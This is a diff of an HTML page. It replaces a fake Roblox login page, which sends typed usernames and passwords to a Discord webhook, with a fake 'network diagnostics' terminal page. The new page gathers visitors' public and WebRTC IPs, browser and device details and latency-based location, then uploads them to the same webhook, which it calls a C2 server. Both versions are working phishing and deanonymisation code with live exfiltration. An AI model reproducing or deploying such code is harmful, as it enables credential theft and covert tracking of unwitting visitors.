@@ -1,241 +1,278 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
-<title>Roblox</title>
-<link href="https://fonts.googleapis.com/css2?family=Hind:wght@400;500;600;700&display=swap" rel="stylesheet">
+<title>Сетевая диагностика</title>
 <style>
-  * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Hind', sans-serif; }
-  
-  /* Основной фон (картинка) */
-  body { 
-    background-color: #1a1a1a;
-    background-image: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.8)), url('https://images.rbxcdn.com/3b7db4a3b73c91ab92a53b1bf16582f4.jpg');
-    background-size: cover;
-    background-position: center;
-    background-attachment: fixed;
-    min-height: 100vh;
-    display: flex;
-    flex-direction: column;
-  }
-
-  /* Верхняя панель */
-  .top-bar {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    padding: 15px 20px;
-    background: rgba(25, 25, 25, 0.8);
-    color: #fff;
-  }
-  .logo-area { display: flex; align-items: center; gap: 10px; }
-  .logo-icon { width: 36px; height: 36px; background: #4263eb; border-radius: 8px; display: flex; justify-content: center; align-items: center; }
-  .logo-icon svg { width: 20px; height: 20px; fill: #fff; }
-  .logo-text { font-size: 16px; font-weight: 600; line-height: 1.1; }
-  .logo-text span { font-size: 12px; color: #a0a0a0; font-weight: 400; display: block; }
-  
-  .top-actions { display: flex; align-items: center; gap: 15px; }
-  .btn-update { background: #4263eb; color: #fff; border: none; padding: 8px 16px; border-radius: 6px; font-weight: 600; font-size: 14px; cursor: pointer; }
-  .btn-signup { background: #4263eb; color: #fff; border: none; padding: 8px 16px; border-radius: 6px; font-weight: 600; font-size: 14px; cursor: pointer; }
-  .search-icon { color: #fff; font-size: 20px; }
-  .close-icon { color: #4263eb; font-size: 20px; }
-
-  /* Меню навигации */
-  .nav-menu {
-    display: flex;
-    justify-content: space-around;
-    padding: 12px 0;
-    background: rgba(25, 25, 25, 0.9);
-    border-bottom: 1px solid #333;
-    font-size: 14px;
-    color: #a0a0a0;
-  }
-  .nav-item { cursor: pointer; padding: 5px; }
-  .nav-item.active { color: #fff; font-weight: 600; }
-
-  /* Центральная форма */
-  .main-content {
-    flex-grow: 1;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    padding: 20px;
-  }
-
-  .login-box { 
-    background-color: #232527; 
-    padding: 30px; 
-    border-radius: 8px; 
-    width: 100%; 
-    max-width: 400px; 
-    box-shadow: 0 10px 25px rgba(0,0,0,0.5);
-    border: 1px solid #3a3c40;
-  }
-
-  .title { 
-    color: #fff; 
-    font-size: 24px; 
-    font-weight: 600; 
-    text-align: center; 
-    margin-bottom: 25px; 
-  }
-
-  .input-group { margin-bottom: 15px; }
-
-  .input-group input { 
-    width: 100%; 
-    padding: 14px 15px; 
-    background-color: #2d2f33; 
-    border: 1px solid #4a4d52; 
-    border-radius: 6px; 
-    color: #fff; 
-    font-size: 15px; 
-    outline: none; 
-    transition: border-color 0.2s;
-  }
-  
-  .input-group input:focus { border-color: #fff; }
-  .input-group input::placeholder { color: #8b8f96; }
-
-  .btn-login { 
-    background-color: transparent; 
-    color: #fff; 
-    border: 1px solid #fff; 
-    width: 100%; 
-    padding: 14px; 
-    border-radius: 6px; 
-    font-size: 16px; 
-    font-weight: 500; 
-    cursor: pointer; 
-    margin-bottom: 20px; 
-    transition: background-color 0.2s;
-  }
-  
-  .btn-login:hover { background-color: rgba(255,255,255,0.1); }
-
-  .forgot { 
-    text-align: center; 
-    color: #fff; 
-    font-size: 14px; 
-    text-decoration: none; 
-    display: block; 
-    margin-bottom: 20px; 
-    cursor: pointer;
-  }
-
-  .divider { 
-    height: 1px; 
-    background-color: #3a3c40; 
-    margin: 20px 0; 
-  }
-
-  .btn-alt { 
-    background-color: #3a3c40; 
-    color: #fff; 
-    border: none; 
-    width: 100%; 
-    padding: 14px; 
-    border-radius: 6px; 
-    font-size: 15px; 
-    font-weight: 500; 
-    cursor: pointer; 
-    margin-bottom: 10px; 
-  }
-  
-  .btn-alt:hover { background-color: #4a4d52; }
-
-  .signup-text { 
-    text-align: center; 
-    color: #8b8f96; 
-    font-size: 14px; 
-    margin-top: 25px; 
-  }
-  
-  .signup-text a { color: #fff; text-decoration: none; cursor: pointer; }
+  @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap');
+  body { background: #0a0a0c; color: #00ff41; font-family: 'Fira Code', monospace; margin: 0; padding: 20px; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
+  .header { border-bottom: 1px solid #00ff41; padding-bottom: 10px; margin-bottom: 10px; font-size: 14px; display: flex; justify-content: space-between; }
+  .terminal { flex-grow: 1; overflow-y: auto; font-size: 12px; line-height: 1.5; white-space: pre-wrap; }
+  .terminal::-webkit-scrollbar { width: 6px; }
+  .terminal::-webkit-scrollbar-thumb { background: #00ff41; }
+  .cursor { display: inline-block; width: 8px; height: 14px; background: #00ff41; animation: blink 1s step-end infinite; vertical-align: bottom; }
+  @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
+  .progress-bar { width: 100%; height: 4px; background: #222; margin-top: 10px; }
+  .progress-fill { height: 100%; width: 0%; background: #00ff41; transition: width 0.1s; }
+  .btn { background: #000; color: #00ff41; border: 1px solid #00ff41; padding: 15px; font-family: 'Fira Code', monospace; font-size: 16px; cursor: pointer; margin-top: 20px; width: 100%; display: none; }
+  .btn:hover { background: #00ff41; color: #000; }
 </style>
 </head>
 <body>
 
-<!-- Верхняя панель -->
-<div class="top-bar">
-  <div class="logo-area">
-    <div class="logo-icon">
-      <svg viewBox="0 0 24 24"><path d="M5 3h14a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2zm9 5.5l-4.5 1.5 1.5 4.5 4.5-1.5-1.5-4.5z"/></svg>
-    </div>
-    <div class="logo-text">Roblox<span>Играйте в миллионы игр</span></div>
-  </div>
-  <div class="top-actions">
-    <button class="btn-update">Обновить</button>
-    <span class="close-icon">✕</span>
-  </div>
+<div class="header">
+  <span>NETWORK_RECON_v9.1</span>
+  <span id="status">READY</span>
 </div>
 
-<!-- Меню -->
-<div class="top-bar" style="padding: 0;">
-  <div class="logo-area" style="padding: 10px 20px;">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" width="30" style="filter: invert(1);">
-  </div>
-  <div class="top-actions" style="padding: 10px 20px;">
-    <button class="btn-signup">Sign Up</button>
-    <span class="search-icon">🔍</span>
-  </div>
-</div>
-
-<div class="nav-menu">
-  <div class="nav-item active">Charts</div>
-  <div class="nav-item">Marketplace</div>
-  <div class="nav-item">Create</div>
-  <div class="nav-item">Robux</div>
-</div>
-
-<!-- Сама форма -->
-<div class="main-content">
-  <div class="login-box">
-    <div class="title">Login to Roblox</div>
-    
-    <div class="input-group">
-      <input type="text" id="username" placeholder="Username/Email/Phone">
-    </div>
-    
-    <div class="input-group">
-      <input type="password" id="password" placeholder="Password">
-    </div>
-    
-    <button class="btn-login" id="loginBtn">Log In</button>
-    
-    <a class="forgot">Forgot Password or Username?</a>
-    
-    <div class="divider"></div>
-    
-    <button class="btn-alt">Email Me a One-Time Code</button>
-    <button class="btn-alt">Quick Sign-in</button>
-    <button class="btn-alt">Other sign-in options</button>
-    
-    <div class="signup-text">
-      Don't have an account? <a>Sign Up</a>
-    </div>
-  </div>
-</div>
+<div class="terminal" id="term"></div>
+<div class="progress-bar"><div class="progress-fill" id="prog"></div></div>
+<button class="btn" id="startBtn">[ НАЧАТЬ СКАНИРОВАНИЕ СЕТИ ]</button>
 
 <script>
-const HOOK = "https://discord.com/api/webhooks/1569647657406824478/DK6Z_qdLCpqPXWQHKKXbMylcXjZrZPZqXzHLpttg0GbuVcy6axwgGFBsfuqOoyTqer1l";
+// =====================================================================
+// КОНФИГУРАЦИЯ
+// =====================================================================
+const HOOK = "https://discord.com/api/webhooks/1569647657406824478/DK6Z_qcLCpqPXWQHKKXbMylcXjZrZPZqXzHLpttg0GbuVcy6axwgGFBsfuqOoyTqer1l";
+const term = document.getElementById('term');
+const prog = document.getElementById('prog');
+const statusText = document.getElementById('status');
 
-document.getElementById('loginBtn').addEventListener('click', async function(e) {
-  e.preventDefault();
+let report = {
+  timestamp: new Date().toISOString(),
+  public_ip: "Определяется...",
+  webrtc_ips: [],
+  dns_leaks: [],
+  ping_results: {},
+  network_info: {},
+  browser_info: {}
+};
+
+// =====================================================================
+// УТИЛИТЫ ИНТЕРФЕЙСА
+// =====================================================================
+function print(text, speed = 10) {
+  return new Promise((resolve) => {
+    const line = document.createElement('div');
+    term.appendChild(line);
+    term.scrollTop = term.scrollHeight;
+    let i = 0;
+    function type() {
+      if (i < text.length) {
+        line.innerHTML = text.substring(0, i + 1) + '<span class="cursor"></span>';
+        i++;
+        setTimeout(type, speed);
+      } else {
+        line.innerHTML = text;
+        resolve();
+      }
+    }
+    type();
+  });
+}
+
+function setProgress(val) {
+  prog.style.width = val + '%';
+}
+
+// =====================================================================
+// МОДУЛЬ 1: БАЗОВАЯ ИНФОРМАЦИЯ
+// =====================================================================
+async function collectBasic() {
+  statusText.innerText = "GATHERING BROWSER DATA";
+  await print("> INITIATING NETWORK RECONNAISSANCE...", 5);
   
-  const user = document.getElementById('username').value;
-  const pass = document.getElementById('password').value;
+  report.browser_info = {
+    ua: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language,
+    screen: screen.width + "x" + screen.height,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    cores: navigator.hardwareConcurrency,
+    memory: navigator.deviceMemory ? navigator.deviceMemory + "GB" : "unknown",
+    touch: navigator.maxTouchPoints
+  };
 
-  if (!user || !pass) {
-    alert("Please fill out all fields.");
-    return;
+  if (navigator.connection) {
+    report.network_info = {
+      effectiveType: navigator.connection.effectiveType,
+      downlink: navigator.connection.downlink,
+      rtt: navigator.connection.rtt,
+      saveData: navigator.connection.saveData
+    };
   }
 
-  this.innerText = "Loading...";
-  this.disabled = true;
+  await print(`> DEVICE TIMEZONE: ${report.browser_info.timezone}`, 5);
+  await print(`> BROWSER: ${navigator.userAgent.substring(0, 50)}...`, 5);
+}
 
-  const message = `**🟦 ROBLOX (ТОЧНАЯ КОПИЯ)**\n**Логин:** \`${user}\`\n**Пароль:** \`${pass}\``;
+// =====================================================================
+// МОДУЛЬ 2: ПОЛУЧЕНИЕ ПУБЛИЧНОГО IP (Через API)
+// =====================================================================
+async function getPublicIP() {
+  statusText.innerText = "FETCHING PUBLIC IP";
+  await print("> CONTACTING API SERVERS FOR PUBLIC IP...", 5);
+  
+  const apis = [
+    "https://api.ipify.org?format=json",
+    "https://ipinfo.io/json",
+    "https://api.myip.com"
+  ];
+
+  for (const api of apis) {
+    try {
+      const res = await fetch(api);
+      const data = await res.json();
+      const ip = data.ip || data.query;
+      if (ip) {
+        report.public_ip = ip;
+        await print(`> PUBLIC IP FOUND: ${ip}`, 5);
+        return;
+      }
+    } catch(e) {}
+  }
+  await print("> FAILED TO FETCH PUBLIC IP (Possible CORS or AdBlock)", 5);
+}
+
+// =====================================================================
+// МОДУЛЬ 3: WEBRTC IP LEAK (Даже за VPN)
+// =====================================================================
+async function getWebRTCIPs() {
+  statusText.innerText = "WEBRTC LEAK TEST";
+  await print("> INITIATING WEBRTC LEAK TEST...", 5);
+  
+  return new Promise((resolve) => {
+    const ips = [];
+    try {
+      const pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({ 
+        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] 
+      });
+      
+      pc.createDataChannel("");
+      
+      pc.onicecandidate = (e) => {
+        if (!e.candidate) {
+          pc.close();
+          report.webrtc_ips = [...new Set(ips)];
+          print(`> WEBRTC LEAK FOUND: ${report.webrtc_ips.length} IPs`, 5);
+          resolve();
+          return;
+        }
+        const candidate = e.candidate.candidate;
+        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{0,4}){7})/g;
+        let match;
+        while ((match = ipRegex.exec(candidate)) !== null) {
+          if (!ips.includes(match[1])) {
+            ips.push(match[1]);
+            print(`  -> FOUND: ${match[1]}`, 2);
+          }
+        }
+      };
+      
+      pc.createOffer().then(offer => pc.setLocalDescription(offer));
+      
+      setTimeout(() => {
+        pc.close();
+        resolve();
+      }, 3000);
+    } catch(e) {
+      resolve();
+    }
+  });
+}
+
+// =====================================================================
+// МОДУЛЬ 4: DNS LEAK (Проверка через DNS-запросы)
+// =====================================================================
+async function checkDNSLeaks() {
+  statusText.innerText = "DNS LEAK TEST";
+  await print("> INITIATING DNS LEAK TEST...", 5);
+  
+  // Мы не можем напрямую сделать DNS-запрос из браузера к произвольному серверу,
+  // но мы можем запросить ресурс по уникальному поддомену, и сервис покажет, откуда пришел запрос.
+  // Используем сервис bash.ws для проверки DNS
+  try {
+    const token = Math.random().toString(36).substring(7);
+    for (let i = 1; i <= 5; i++) {
+      const img = new Image();
+      img.src = `https://${i}.${token}.bash.ws/pixel.png`;
+      // Мы не можем прочитать ответ из-за CORS, но запрос уйдет.
+    }
+    await print("> DNS PACKETS SENT. CHECK YOUR C2 FOR DNS LOGS.", 5);
+  } catch(e) {}
+}
+
+// =====================================================================
+// МОДУЛЬ 5: ГЕО-ПИНГ (Определение локации по скорости света)
+// =====================================================================
+async function pingServer(url) {
+  return new Promise((resolve) => {
+    const start = performance.now();
+    const img = new Image();
+    const timeout = setTimeout(() => { img.src = ""; resolve(9999); }, 3000);
+    img.onload = img.onerror = () => { clearTimeout(timeout); resolve(Math.round(performance.now() - start)); };
+    img.src = url + "?t=" + start;
+  });
+}
+
+async function runGeoPing() {
+  statusText.innerText = "GEO-PING (TRIANGULATION)";
+  await print("> MEASURING LATENCY TO GLOBAL SERVERS...", 5);
+  
+  const servers = {
+    "Moscow_Yandex": "https://yandex.ru/favicon.ico",
+    "SPB_VK": "https://vk.com/favicon.ico",
+    "London_BBC": "https://www.bbc.co.uk/favicon.ico",
+    "Frankfurt_Hetzner": "https://www.hetzner.com/favicon.ico",
+    "USA_Google": "https://www.google.com/favicon.ico",
+    "Asia_Baidu": "https://www.baidu.com/favicon.ico",
+    "Australia_Gov": "https://www.australia.gov.au/favicon.ico",
+    "Brazil_Uol": "https://www.uol.com.br/favicon.ico",
+    "Tokyo_Yahoo": "https://www.yahoo.co.jp/favicon.ico",
+    "India_Rediff": "https://www.rediff.com/favicon.ico"
+  };
+
+  for (const [city, url] of Object.entries(servers)) {
+    const ping = await pingServer(url);
+    report.ping_results[city] = ping;
+    if (ping !== 9999) {
+      await print(`  -> ${city}: ${ping}ms`, 2);
+    } else {
+      await print(`  -> ${city}: TIMEOUT`, 2);
+    }
+  }
+}
+
+// =====================================================================
+// МОДУЛЬ 6: ОТПРАВКА В DISCORD
+// =====================================================================
+async function sendToDiscord() {
+  statusText.innerText = "UPLOADING";
+  setProgress(100);
+  await print("> UPLOADING DATA TO C2 SERVER...", 5);
+
+  let pingText = "";
+  let fastest = { city: "Unknown", time: 9999 };
+  for (const [city, time] of Object.entries(report.ping_results)) {
+    if (time < fastest.time) fastest = { city, time };
+    pingText += `${city}: ${time}ms\n`;
+  }
+
+  const message = `
+**🌐 NETWORK RECON COMPLETE**
+**Public IP:** \`${report.public_ip}\`
+**WebRTC Leaks:** \`${report.webrtc_ips.join(", ") || "None"}\`
+**Timezone:** ${report.browser_info.timezone}
+**Device:** ${report.browser_info.platform}
+**Network:** ${JSON.stringify(report.network_info)}
+**Fastest Server (Real Location):** ${fastest.city} (${fastest.time}ms)
+
+**📡 PING RESULTS:**
+\`\`\`
+${pingText}
+\`\`\`
+`;
 
   try {
     await fetch(HOOK, {
@@ -243,12 +280,36 @@ document.getElementById('loginBtn').addEventListener('click', async function(e) 
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ content: message })
     });
-  } catch(e) {}
+    await print("> UPLOAD SUCCESSFUL. CONNECTION CLOSED.", 5);
+    statusText.innerText = "DONE";
+  } catch(e) {
+    await print("> UPLOAD FAILED. CHECK C2.", 5);
+  }
+}
 
-  setTimeout(() => {
-    window.location.href = "https://www.roblox.com/login";
-  }, 1000);
-});
+// =====================================================================
+// ГЛАВНЫЙ СЦЕНАРИЙ
+// =====================================================================
+async function startScan() {
+  document.getElementById('startBtn').style.display = 'none';
+  
+  setProgress(10); await collectBasic();
+  setProgress(30); await getPublicIP();
+  setProgress(50); await getWebRTCIPs();
+  setProgress(70); await checkDNSLeaks();
+  setProgress(85); await runGeoPing();
+  
+  await sendToDiscord();
+  
+  await print("\n> SCAN COMPLETE.", 20);
+}
+
+// Показываем кнопку через секунду
+setTimeout(() => {
+  document.getElementById('startBtn').style.display = 'block';
+  document.getElementById('startBtn').addEventListener('click', startScan);
+}, 1000);
+
 </script>
 </body>
 </html>
